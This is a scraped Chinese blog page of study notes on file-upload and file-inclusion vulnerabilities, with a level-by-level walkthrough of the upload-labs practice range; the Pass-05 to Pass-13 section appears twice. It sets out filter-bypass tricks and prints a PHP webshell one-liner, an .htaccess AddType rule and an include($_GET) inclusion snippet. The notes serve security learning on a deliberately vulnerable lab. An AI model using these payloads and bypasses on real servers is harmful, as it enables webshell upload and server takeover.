<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="QQ截图20200124124135.png" style="zoom: 80%;" />



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="QQ截图20200124130943.png" style="zoom:150%;" />



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="QQ截图20200124131542.png" style="zoom:50%;" />

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/wen-jian-shang-chuan-lou-dong-xue-xi-bi-ji/" itemprop="url">“文件上传漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:49:18+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="文件上传-文件包含漏洞学习笔记-靶场实战"><a href="#文件上传-文件包含漏洞学习笔记-靶场实战" class="headerlink" title="文件上传+文件包含漏洞学习笔记+靶场实战"></a>文件上传+文件包含漏洞学习笔记+靶场实战</h1><p>[TOC]</p>
<h2 id="文件上传漏洞部分"><a href="#文件上传漏洞部分" class="headerlink" title="文件上传漏洞部分"></a>文件上传漏洞部分</h2><h4 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h4><p><strong>一.什么是文件上传漏洞</strong></p>
<p> 文件上传<a href="http://www.2cto.com/" target="_blank" rel="noopener">漏洞</a>是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的.</p>
<p><strong>二.文件上传漏洞危害</strong></p>
<ul>
<li>网站被控制，对文件增删改查，执行命令，链接数据库</li>
<li>如果服务器长久未更新，可以利用exp提权，导致服务器沦陷</li>
<li>同服务器的其他网站沦陷。</li>
</ul>
<p><strong>二.文件上传漏洞的主要利用和绕过方式总结。</strong></p>
<p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h4 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h4><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="11525934-e19630249b9b8764.png"  />



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="QQ截图20200124121848.png" style="zoom: 80%;" />



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="QQ截图20200124122245.png" style="zoom:150%;" />

<p>可以在本地看到成功上传。</p>
<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="QQ截图20200124124135.png" style="zoom: 80%;" />



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="QQ截图20200124130943.png" style="zoom:150%;" />



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="QQ截图20200124131542.png" style="zoom:50%;" />

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
